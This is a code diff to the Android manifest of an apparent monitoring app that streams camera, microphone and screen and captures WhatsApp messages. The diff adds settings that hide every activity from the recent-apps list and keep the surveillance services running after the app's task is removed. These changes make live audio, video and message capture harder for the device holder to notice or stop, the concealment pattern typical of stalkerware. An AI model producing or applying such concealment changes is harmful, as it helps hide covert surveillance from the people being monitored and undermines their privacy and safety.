@@ -81,6 +81,8 @@
         <activity
             android:name=".ui.SplashActivity"
             android:exported="true"
+            android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true"
             android:theme="@style/Theme.SpappMonitoring">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -91,7 +93,9 @@
         <!-- Mandatory first-launch consent screen -->
         <activity
             android:name=".ui.ConsentActivity"
-            android:exported="false" />
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true" />
 
         <!-- Device code entry + backend activation, shown right after consent is granted.
              exported=true + the intent-filters below let the dashboard's QR code / shareable
@@ -106,7 +110,9 @@
                  as a second attempt once it loads in the browser. -->
         <activity
             android:name=".ui.ActivationActivity"
-            android:exported="true">
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true">
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
@@ -127,7 +133,9 @@
         <!-- Main status screen shown after consent + activation -->
         <activity
             android:name=".ui.MainActivity"
-            android:exported="false" />
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true" />
 
         <!-- Fired by the OS when a registered geofence boundary is crossed (Phase 5) -->
         <receiver
@@ -170,6 +178,7 @@
         <service
             android:name=".blocking.BlockAccessibilityService"
             android:exported="true"
+            android:stopWithTask="false"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -183,24 +192,28 @@
         <service
             android:name=".camerastream.CameraStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="camera" />
 
         <!-- Live surrounding / ambient audio streaming service -->
         <service
             android:name=".audiostream.AudioStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="microphone" />
 
         <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
         <service
             android:name=".screenstream.ScreenStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- Notification listener for WhatsApp chat message capture -->
         <service
             android:name=".collectors.WhatsAppNotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:stopWithTask="false"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
